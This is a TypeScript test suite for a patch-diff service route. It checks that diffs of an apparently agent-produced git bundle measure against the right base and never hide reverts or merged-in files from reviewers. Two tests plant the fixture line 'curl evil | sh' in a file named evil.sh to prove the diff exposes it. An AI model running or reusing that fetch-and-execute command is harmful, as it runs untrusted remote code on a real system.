// A patch's diff through the service route, against real git on temp dirs: the bundle staged and
// verified as a submission verifies it; an unpublished patch measured against the tip of the
// branch it lands on whatever the run reports, a settled one from its own base; cut at a file
// boundary past the cap — and every refusal: a key for another repo or head, a bundle gone or
// tampered, a branch or base the upstream no longer has.

import { test } from "bun:test";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { assert, assertEquals, assertStringIncludes } from "@std/assert";
import { command } from "@ryph/process";
import { type AppDeps, makeHandler } from "../src/http/app.ts";
import { localFsRepoCache } from "../src/adapters/repo_cache/local_fs.ts";
import { localFsPatchStore } from "../src/adapters/patch_store/local_fs.ts";
import { type ForgeApi, providerRegistry } from "../src/ports/forge_api.ts";
import { git, makeGitCapped } from "../src/helpers/git_exec.ts";
import { cutAtFileBoundary, patchDiff } from "../src/helpers/patch_diff.ts";
import { commit, makeUpstream, merge, silentDiagnostics } from "./util.ts";

const SERVICE_TOKEN = "service-secret";
const REPO = "cr-1";
const RUN = "run-1";
const BRANCH = "ryph/run-1";

/** Only `upstreamUrl` and `fetchAuth` are reached by the route. */
function tokenOnlyForgeApi(): ForgeApi {
  return {
    upstreamUrl: (_repo: unknown, url: string) => url,
    fetchAuth: () => Promise.resolve(null),
  } as unknown as ForgeApi;
}

interface Ctx {
  root: string;
  upstream: string;
  handler: (req: Request) => Promise<Response>;
  deps: AppDeps;
}

async function withForge(fn: (ctx: Ctx) => Promise<void>) {
  const root = await mkdtemp(join(tmpdir(), "ryph-"));
  try {
    const upstream = `${root}/upstream`;
    await makeUpstream(upstream, "patch-diff");
    const diag = silentDiagnostics();
    const stagingDir = `${root}/staging`;
    await mkdir(stagingDir, { recursive: true });
    const never = () => Promise.reject(new Error("not part of this surface"));
    const deps: AppDeps = {
      keys: { resolve: () => Promise.resolve(null) },
      cache: localFsRepoCache({ root: `${root}/cache`, diag }),
      patches: localFsPatchStore(`${root}/patches`, diag),
      diag,
      forges: providerRegistry({ github: tokenOnlyForgeApi() }, "forge API"),
      transports: providerRegistry({ github: { deliver: never } }, "change transport"),
      serviceToken: SERVICE_TOKEN,
      config: { maxUploadPackBytes: 10 * 1024 * 1024, maxBundleBytes: 1024 * 1024, stagingDir },
    };
    await fn({ root, upstream, handler: makeHandler(deps), deps });
  } finally {
    await rm(root, { recursive: true });
  }
}

/** A run's clone with a commit of its own on BRANCH, its bundle filed as intake would file it. */
async function runPatch(ctx: Ctx, files: Record<string, string>) {
  const work = `${ctx.root}/work`;
  await mkdir(work);
  await git(work, "clone", "--quiet", "--", ctx.upstream, ".");
  const baseSha = await git(work, "rev-parse", "HEAD");
  await git(work, "checkout", "--quiet", "-b", BRANCH);
  for (const [path, text] of Object.entries(files)) {
    await writeFile(`${work}/${path}`, text);
  }
  await git(work, "add", ".");
  await commit(work, "the agent's change");
  const headSha = await git(work, "rev-parse", "HEAD");
  const bundlePath = `${ctx.root}/patch.bundle`;
  await git(work, "bundle", "create", bundlePath, `${baseSha}..refs/heads/${BRANCH}`);
  const bundleKey = `${RUN}/${REPO}/${headSha}.bundle`;
  await ctx.deps.patches.put(bundleKey, bundlePath);
  return { work, baseSha, headSha, bundleKey };
}

/** Where the route files a diff: beside the bundle, keyed on what it was asked. */
const diffKey = (headSha: string, baseSha: string | null) =>
  `${RUN}/${REPO}/${headSha}.diff-v6.record.${baseSha ?? "unreported"}.json`;

/**
 * A run that caught up with its base: B → X on the run's branch, then main moves on — merging an
 * old feature branch rooted before B (so the bundle requires two commits) and one commit more —
 * and the run merges main in as Y. The bundle is cut from B, as the runner cuts it.
 */
async function mergedPatch(ctx: Ctx) {
  const work = `${ctx.root}/work`;
  await mkdir(work);
  await git(work, "clone", "--quiet", "--", ctx.upstream, ".");
  const root = await git(work, "rev-parse", "HEAD");
  await writeFile(`${ctx.upstream}/b.txt`, "b\n");
  await git(ctx.upstream, "add", ".");
  await commit(ctx.upstream, "B on main");
  await git(work, "pull", "--quiet", "--ff-only");
  const baseSha = await git(work, "rev-parse", "HEAD");
  await git(work, "checkout", "--quiet", "-b", BRANCH);
  await writeFile(`${work}/x.txt`, "the run's own change\n");
  await git(work, "add", ".");
  await commit(work, "X");
  // Upstream: a feature branch off the root, merged into main, then one commit more.
  await git(ctx.upstream, "checkout", "--quiet", "-b", "feature", root);
  await writeFile(`${ctx.upstream}/f.txt`, "feature\n");
  await git(ctx.upstream, "add", ".");
  await commit(ctx.upstream, "F");
  await git(ctx.upstream, "checkout", "--quiet", "main");
  await merge(ctx.upstream, "--quiet", "--no-ff", "-m", "M1", "feature");
  await writeFile(`${ctx.upstream}/m2.txt`, "m2\n");
  await git(ctx.upstream, "add", ".");
  await commit(ctx.upstream, "M2");
  await git(work, "fetch", "--quiet", "origin");
  await merge(work, "--quiet", "--no-edit", "origin/main");
  const headSha = await git(work, "rev-parse", "HEAD");
  const bundlePath = `${ctx.root}/merged.bundle`;
  await git(work, "bundle", "create", bundlePath, `${baseSha}..refs/heads/${BRANCH}`);
  const bundleKey = `${RUN}/${REPO}/${headSha}.bundle`;
  await ctx.deps.patches.put(bundleKey, bundlePath);
  return {
    work,
    baseSha,
    headSha,
    bundleKey,
    mainTip: await git(ctx.upstream, "rev-parse", "main"),
  };
}

function ask(ctx: Ctx, body: Record<string, unknown>, token = SERVICE_TOKEN) {
  return ctx.handler(
    new Request("http://forge/v1/service/patch-diff", {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
      body: JSON.stringify({
        repo: { provider: "github", repoRef: "acme/app", tenantId: null },
        url: ctx.upstream,
        connectedRepoId: REPO,
        branchName: BRANCH,
        targetRef: "main",
        mode: "live",
        ...body,
      }),
    }),
  );
}

async function assertTerminal(res: Response, status: number, includes: string) {
  assertEquals(res.status, status);
  const body = await res.json();
  assertEquals(body.terminal, true);
  assertStringIncludes(body.error, includes);
}

test("an unpublished patch's diff is what a pull request against its base shows", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "README.md": "# patched\n", "new.txt": "hello\n" });
    const res = await ask(ctx, { bundleKey: p.bundleKey, headSha: p.headSha, baseSha: p.baseSha });
    assertEquals(res.status, 200);
    const body = await res.json();
    assertEquals(body.baseSha, p.baseSha);
    assertEquals(body.headSha, p.headSha);
    assertEquals(body.truncated, false);
    // Exactly git's own answer, from the run's own clone.
    assertEquals(
      body.diff,
      await new Response(
        (await command("git", {
          args: ["diff", "--no-color", "--find-renames", p.baseSha, p.headSha],
          cwd: p.work,
          stdout: "piped",
        }).spawn()).stdout,
      ).text(),
    );
    assertStringIncludes(body.diff, "diff --git a/new.txt b/new.txt");
    assertStringIncludes(body.diff, "+# patched");
  });
});

test("a head's diff is filed beside its bundle, and read back without git or the base", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "README.md": "# patched\n" });
    // A settled patch's diff, filed for good under its head.
    const first = await (await ask(ctx, {
      bundleKey: p.bundleKey,
      headSha: p.headSha,
      baseSha: p.baseSha,
      mode: "record",
    })).json();
    assert(await ctx.deps.patches.get(diffKey(p.headSha, p.baseSha)) !== null);

    // The upstream gone: a computed read would now fail to warm the base. A filed one never asks.
    await rm(ctx.upstream, { recursive: true });
    await rm(`${ctx.root}/cache`, { recursive: true });
    const again = await ask(ctx, {
      bundleKey: p.bundleKey,
      headSha: p.headSha,
      baseSha: p.baseSha,
      mode: "record",
    });
    assertEquals(again.status, 200);
    assertEquals(await again.json(), first);
  });
});

test("concurrent first reads of one head share one computation", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "README.md": "# patched\n" });
    let bundleReads = 0;
    const counting = {
      put: ctx.deps.patches.put,
      delete: ctx.deps.patches.delete,
      get: (key: string) => {
        if (key === p.bundleKey) bundleReads++;
        return ctx.deps.patches.get(key);
      },
    };
    const shared = { ...ctx, handler: makeHandler({ ...ctx.deps, patches: counting }) };
    const body = { bundleKey: p.bundleKey, headSha: p.headSha, baseSha: p.baseSha };
    const answers = await Promise.all([ask(shared, body), ask(shared, body), ask(shared, body)]);
    assertEquals(answers.map((res) => res.status), [200, 200, 200]);
    const [a, b, c] = await Promise.all(answers.map((res) => res.json()));
    assertEquals(a, b);
    assertEquals(b, c);
    assertEquals(bundleReads, 1);
  });
});

test("a base that moved on since the run started shows none of its own work", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    // The base branch moves on after the run cut its bundle: the merge base, not the tip, is
    // what the change is measured against, so upstream's later work is not shown as removed.
    await writeFile(`${ctx.upstream}/later.txt`, "later\n");
    await git(ctx.upstream, "add", ".");
    await commit(ctx.upstream, "later work on main");
    const res = await ask(ctx, { bundleKey: p.bundleKey, headSha: p.headSha, baseSha: null });
    assertEquals(res.status, 200);
    const body = await res.json();
    assertEquals(body.baseSha, p.baseSha);
    assert(!body.diff.includes("later.txt"));
    assertStringIncludes(body.diff, "new.txt");
  });
});

test("a run that merged its base in shows only its own change, as its pull request would", async () => {
  await withForge(async (ctx) => {
    const p = await mergedPatch(ctx);
    for (const baseSha of [p.baseSha, null]) {
      const res = await ask(ctx, { bundleKey: p.bundleKey, headSha: p.headSha, baseSha });
      assertEquals(res.status, 200);
      const body = await res.json();
      // Measured from the main it merged, not from where it started: main's work is main's.
      assertEquals(body.baseSha, p.mainTip);
      assertStringIncludes(body.diff, "x.txt");
      assert(!body.diff.includes("f.txt"));
      assert(!body.diff.includes("m2.txt"));
    }
  });
});

test("pushed onto a change request, the diff is what the push adds to its branch", async () => {
  await withForge(async (ctx) => {
    // The change request's branch: X when the run starts, then a person pushes C, a fix.
    await git(ctx.upstream, "checkout", "--quiet", "-b", "feat");
    await writeFile(`${ctx.upstream}/sec.txt`, "vulnerable\n");
    await git(ctx.upstream, "add", ".");
    await commit(ctx.upstream, "X");
    const x = await git(ctx.upstream, "rev-parse", "HEAD");
    await writeFile(`${ctx.upstream}/sec.txt`, "fixed\n");
    await git(ctx.upstream, "add", ".");
    await commit(ctx.upstream, "C");
    await git(ctx.upstream, "checkout", "--quiet", "main");
    // The run catches up to C and undoes the fix.
    const work = `${ctx.root}/work`;
    await mkdir(work);
    await git(work, "clone", "--quiet", "--", ctx.upstream, ".");
    await git(work, "checkout", "--quiet", "-b", BRANCH, "origin/feat");
    await writeFile(`${work}/sec.txt`, "vulnerable\n");
    await git(work, "add", ".");
    await commit(work, "undo");
    const headSha = await git(work, "rev-parse", "HEAD");
    const bundlePath = `${ctx.root}/onto.bundle`;
    await git(work, "bundle", "create", bundlePath, `${x}..refs/heads/${BRANCH}`);
    const bundleKey = `${RUN}/${REPO}/${headSha}.bundle`;
    await ctx.deps.patches.put(bundleKey, bundlePath);
    const body = await (await ask(ctx, { bundleKey, headSha, baseSha: x, targetRef: "feat" }))
      .json();
    // From the branch's tip, C, not from where the run said it started.
    assertEquals(body.baseSha, await git(ctx.upstream, "rev-parse", "feat"));
    assertStringIncludes(body.diff, "-fixed");
  });
});

test("a base older than where the run started never hides a revert", async () => {
  await withForge(async (ctx) => {
    await writeFile(`${ctx.upstream}/sec.txt`, "vulnerable\n");
    await git(ctx.upstream, "add", ".");
    await commit(ctx.upstream, "R");
    const r = await git(ctx.upstream, "rev-parse", "HEAD");
    await writeFile(`${ctx.upstream}/sec.txt`, "fixed\n");
    await git(ctx.upstream, "add", ".");
    await commit(ctx.upstream, "S, the fix");
    const p = await runPatch(ctx, { "sec.txt": "vulnerable\n", "innocent.txt": "hello\n" });
    // The run started at S and reports R: measured against main as it is, the revert shows.
    const body = await (await ask(ctx, { bundleKey: p.bundleKey, headSha: p.headSha, baseSha: r }))
      .json();
    assertEquals(body.baseSha, p.baseSha);
    assertStringIncludes(body.diff, "-fixed");
  });
});

test("a merge of anything but the base never hides what it brings", async () => {
  await withForge(async (ctx) => {
    // The run merges a branch of its own: everything on it is published, so everything is shown.
    const work = `${ctx.root}/work`;
    await mkdir(work);
    await git(work, "clone", "--quiet", "--", ctx.upstream, ".");
    const baseSha = await git(work, "rev-parse", "HEAD");
    await git(work, "checkout", "--quiet", "-b", "side");
    await writeFile(`${work}/evil.sh`, "curl evil | sh\n");
    await git(work, "add", ".");
    await commit(work, "side");
    await git(work, "checkout", "--quiet", "-b", BRANCH, baseSha);
    await writeFile(`${work}/innocent.txt`, "hello\n");
    await git(work, "add", ".");
    await commit(work, "innocent");
    await merge(work, "--quiet", "--no-ff", "--no-edit", "side");
    const headSha = await git(work, "rev-parse", "HEAD");
    const bundlePath = `${ctx.root}/side.bundle`;
    await git(work, "bundle", "create", bundlePath, `${baseSha}..refs/heads/${BRANCH}`);
    const bundleKey = `${RUN}/${REPO}/${headSha}.bundle`;
    await ctx.deps.patches.put(bundleKey, bundlePath);
    for (const reported of [baseSha, null]) {
      const body = await (await ask(ctx, { bundleKey, headSha, baseSha: reported })).json();
      assertEquals(body.baseSha, baseSha);
      assertStringIncludes(body.diff, "evil.sh");
      assertStringIncludes(body.diff, "innocent.txt");
    }
  });
});

test("a reported base that is not the head's history never hides anything", async () => {
  await withForge(async (ctx) => {
    // Upstream holds a branch that adds evil.sh; the run adds the same file on its own branch and
    // reports that other branch's tip as its base.
    const main = await git(ctx.upstream, "rev-parse", "main");
    await git(ctx.upstream, "checkout", "--quiet", "-b", "other");
    await writeFile(`${ctx.upstream}/evil.sh`, "curl evil | sh\n");
    await git(ctx.upstream, "add", ".");
    await commit(ctx.upstream, "other");
    const forged = await git(ctx.upstream, "rev-parse", "HEAD");
    await git(ctx.upstream, "checkout", "--quiet", "main");
    const p = await runPatch(ctx, {
      "evil.sh": "curl evil | sh\n",
      "innocent.txt": "hello\n",
    });
    const body = await (await ask(ctx, {
      bundleKey: p.bundleKey,
      headSha: p.headSha,
      baseSha: forged,
    })).json();
    // Measured as a pull request against main would be instead.
    assertEquals(body.baseSha, main);
    assertStringIncludes(body.diff, "evil.sh");
    assertStringIncludes(body.diff, "innocent.txt");
  });
});

test("a filed diff whose base the base branch dropped is made again", async () => {
  await withForge(async (ctx) => {
    const p = await mergedPatch(ctx);
    const first = await (await ask(ctx, {
      bundleKey: p.bundleKey,
      headSha: p.headSha,
      baseSha: p.baseSha,
    })).json();
    assertEquals(first.baseSha, p.mainTip);
    assert(!first.diff.includes("m2.txt"));
    // main is force-pushed back past what the run merged: the next read finds a new tip.
    await git(ctx.upstream, "reset", "--quiet", "--hard", `${p.mainTip}~1`);
    const again = await (await ask(ctx, {
      bundleKey: p.bundleKey,
      headSha: p.headSha,
      baseSha: p.baseSha,
    })).json();
    // m2.txt is no longer main's: approving would publish it, so it is shown.
    assertStringIncludes(again.diff, "m2.txt");
    assertStringIncludes(again.diff, "x.txt");
  });
});

test("a later patch of the same branch shows only what it adds", async () => {
  await withForge(async (ctx) => {
    const first = await runPatch(ctx, { "a.txt": "first\n" });
    // The first patch's change request: the run's branch on the upstream, at its head.
    await git(first.work, "push", "--quiet", "origin", `refs/heads/${BRANCH}`);
    await writeFile(`${first.work}/b.txt`, "second\n");
    await git(first.work, "add", ".");
    await commit(first.work, "second");
    const headSha = await git(first.work, "rev-parse", "HEAD");
    const bundlePath = `${ctx.root}/second.bundle`;
    await git(first.work, "bundle", "create", bundlePath, `${first.baseSha}..refs/heads/${BRANCH}`);
    const bundleKey = `${RUN}/${REPO}/${headSha}.bundle`;
    await ctx.deps.patches.put(bundleKey, bundlePath);
    const body = await (await ask(ctx, {
      bundleKey,
      headSha,
      baseSha: first.baseSha,
      targetRef: BRANCH,
    })).json();
    assertEquals(body.baseSha, first.headSha);
    assertStringIncludes(body.diff, "b.txt");
    assert(!body.diff.includes("a.txt"));
  });
});

test("a name with an accent reaches the reader as itself", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "é ü.txt": "hello\n" });
    const body = await (await ask(ctx, {
      bundleKey: p.bundleKey,
      headSha: p.headSha,
      baseSha: p.baseSha,
    })).json();
    assertStringIncludes(body.diff, "diff --git a/é ü.txt b/é ü.txt");
  });
});

test("a key that is not this repo's head is refused before the store is asked", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    await assertTerminal(
      await ask(ctx, {
        bundleKey: `${RUN}/other-repo/${p.headSha}.bundle`,
        headSha: p.headSha,
        baseSha: p.baseSha,
      }),
      400,
      "not this repo's head",
    );
  });
});

test("a missing bundle is gone, and a bundle whose head is not the recorded one is refused", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    const other = "0".repeat(40);
    await assertTerminal(
      await ask(ctx, {
        bundleKey: `${RUN}/${REPO}/${other}.bundle`,
        headSha: other,
        baseSha: p.baseSha,
      }),
      410,
      "no bundle",
    );
    // The stored bytes under a key naming another head: the provenance check refuses them.
    // (The store took the first file; the same bundle is cut again.)
    const bundlePath = `${ctx.root}/again.bundle`;
    await git(p.work, "bundle", "create", bundlePath, `${p.baseSha}..refs/heads/${BRANCH}`);
    await ctx.deps.patches.put(`${RUN}/${REPO}/${other}.bundle`, bundlePath);
    await assertTerminal(
      await ask(ctx, {
        bundleKey: `${RUN}/${REPO}/${other}.bundle`,
        headSha: other,
        baseSha: p.baseSha,
      }),
      409,
      "is not the recorded",
    );
  });
});

test("a branch gone refuses an unpublished patch's diff, not a settled one's", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    // Nothing can be published to a branch that is gone, so there is nothing to measure against.
    await assertTerminal(
      await ask(ctx, {
        bundleKey: p.bundleKey,
        headSha: p.headSha,
        baseSha: p.baseSha,
        targetRef: "no-such-branch",
      }),
      409,
      "no-such-branch, is gone from the repo",
    );
    // A settled one (a merged pull request's, its branch deleted) is shown from its own base.
    for (const baseSha of [p.baseSha, null]) {
      const body = await (await ask(ctx, {
        bundleKey: p.bundleKey,
        headSha: p.headSha,
        baseSha,
        targetRef: "no-such-branch",
        mode: "record",
      })).json();
      assertEquals(body.baseSha, p.baseSha);
      assertStringIncludes(body.diff, "new.txt");
    }
  });
});

test("a tip that does not answer is worth another try, not a branch gone", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    const silent = {
      ...ctx,
      handler: makeHandler({
        ...ctx.deps,
        cache: { ...ctx.deps.cache, serveBase: () => Promise.reject(new Error("timed out")) },
      }),
    };
    const res = await ask(silent, { bundleKey: p.bundleKey, headSha: p.headSha, baseSha: null });
    assertEquals(res.status, 503);
    assertEquals((await res.json()).terminal, undefined);
  });
});

test("a tip only an old copy holds is no tip: the diff waits for the upstream", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    const real = ctx.deps.cache.serveBase;
    const stale = {
      ...ctx,
      handler: makeHandler({
        ...ctx.deps,
        cache: {
          ...ctx.deps.cache,
          // The upstream did not answer; the cache served the copy it kept.
          serveBase: async (...args: Parameters<typeof real>) => ({
            ...await real(...args),
            freshness: { kind: "stale" as const, since: "2026-01-01T00:00:00.000Z" },
          }),
        },
      }),
    };
    const res = await ask(stale, { bundleKey: p.bundleKey, headSha: p.headSha, baseSha: null });
    assertEquals(res.status, 503);
    assertEquals((await res.json()).terminal, undefined);
    // Nothing measured from the old copy is kept: the next read, once it answers, measures anew.
    const fresh = await ask(ctx, { bundleKey: p.bundleKey, headSha: p.headSha, baseSha: null });
    assertEquals(fresh.status, 200);
    assertStringIncludes((await fresh.json()).diff, "new.txt");
  });
});

test("a settled patch that needs its branch's tip waits out an outage, never refused", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    // The branch's whole history in one bundle, and no base reported: only the tip anchors it.
    const whole = `${ctx.root}/whole.bundle`;
    await git(p.work, "bundle", "create", whole, `refs/heads/${BRANCH}`);
    await ctx.deps.patches.put(p.bundleKey, whole);
    // The cache already holds the branch, so the bundle stages without the upstream; only the
    // tip, which the diff is anchored on, needs it.
    assertEquals(
      (await ask(ctx, { bundleKey: p.bundleKey, headSha: p.headSha, baseSha: null })).status,
      200,
    );
    const silent = {
      ...ctx,
      handler: makeHandler({
        ...ctx.deps,
        cache: { ...ctx.deps.cache, serveBase: () => Promise.reject(new Error("timed out")) },
      }),
    };
    const res = await ask(silent, {
      bundleKey: p.bundleKey,
      headSha: p.headSha,
      baseSha: null,
      mode: "record",
    });
    assertEquals(res.status, 503);
    assertEquals((await res.json()).terminal, undefined);
  });
});

test("a base commit the upstream does not have is terminal", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    await assertTerminal(
      await ask(ctx, {
        bundleKey: p.bundleKey,
        headSha: p.headSha,
        baseSha: "1".repeat(40),
        mode: "record",
      }),
      409,
      "is gone from the repo",
    );
  });
});

test("a bundle that requires nothing needs its branch, and a branch gone is terminal", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, { "new.txt": "hello\n" });
    // The branch's whole history in one bundle: it requires nothing, so names no base.
    const whole = `${ctx.root}/whole.bundle`;
    await git(p.work, "bundle", "create", whole, `refs/heads/${BRANCH}`);
    await ctx.deps.patches.put(p.bundleKey, whole);
    await assertTerminal(
      await ask(ctx, {
        bundleKey: p.bundleKey,
        headSha: p.headSha,
        baseSha: null,
        targetRef: "no-such-branch",
        mode: "record",
      }),
      409,
      "no-such-branch, is gone from the repo",
    );
  });
});

test("the service token is required", async () => {
  await withForge(async (ctx) => {
    const res = await ask(ctx, { bundleKey: "a/b/c", headSha: "0".repeat(40), baseSha: null }, "x");
    assertEquals(res.status, 401);
    await res.body?.cancel();
  });
});

test("a capped diff keeps only whole files", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, {
      "a.txt": "a\n".repeat(200),
      "b.txt": "b\n".repeat(200),
      "c.txt": "c\n".repeat(200),
    });
    const capped = makeGitCapped(silentDiagnostics());
    const whole = await capped(ctx.upstream, 1 << 20, "--version");
    assertEquals(whole.truncated, false);
    // Over the cap mid-way through b.txt: a.txt survives whole, b.txt and c.txt do not.
    const cut = await capped(p.work, 1000, "diff", p.baseSha, p.headSha);
    assertEquals(cut.truncated, true);
    assertEquals(cut.out.length, 1000);
    const text = cutAtFileBoundary(new TextDecoder().decode(cut.out));
    assertStringIncludes(text, "diff --git a/a.txt b/a.txt");
    assert(!text.includes("b.txt"));
    assert(text.endsWith("\n"));
    // A first file over the cap on its own leaves nothing rather than half its hunks.
    assertEquals(cutAtFileBoundary("diff --git a/x b/x\n+partial"), "");
  });
});

test("a cut diff names the files it leaves out", async () => {
  await withForge(async (ctx) => {
    const p = await runPatch(ctx, {
      "a.txt": "a\n".repeat(200),
      "b.txt": "b\n".repeat(200),
      "c d.txt": "c\n".repeat(200),
    });
    const at = (
      maxBytes: number,
      limits: { maxNameListBytes?: number; maxOmitted?: number } = {},
    ) =>
      patchDiff({
        dir: p.work,
        headSha: p.headSha,
        baseSha: p.baseSha,
        prerequisites: [p.baseSha],
        mode: "record",
        tip: () => Promise.resolve(null),
        maxBytes,
        ...limits,
        git,
        capped: makeGitCapped(silentDiagnostics()),
      });
    const cut = await at(1000);
    assertEquals(cut.truncated, true);
    assertStringIncludes(cut.diff, "a.txt");
    assertEquals([cut.omitted, cut.moreOmitted], [["b.txt", "c d.txt"], false]);
    // The first file over the cap on its own: nothing kept, every file named.
    assertEquals((await at(100)).omitted, ["a.txt", "b.txt", "c d.txt"]);
    assertEquals((await at(1 << 20)).omitted, []);
    // Past the most it names, it says there are more.
    const few = await at(1000, { maxOmitted: 1 });
    assertEquals([few.omitted, few.moreOmitted], [["b.txt"], true]);
    // A name list cut mid-name ("a.txt\0b.txt\0c d" at 15 bytes) names only whole names.
    const clipped = await at(1000, { maxNameListBytes: 15 });
    assertEquals([clipped.omitted, clipped.moreOmitted], [["b.txt"], true]);
  });
});
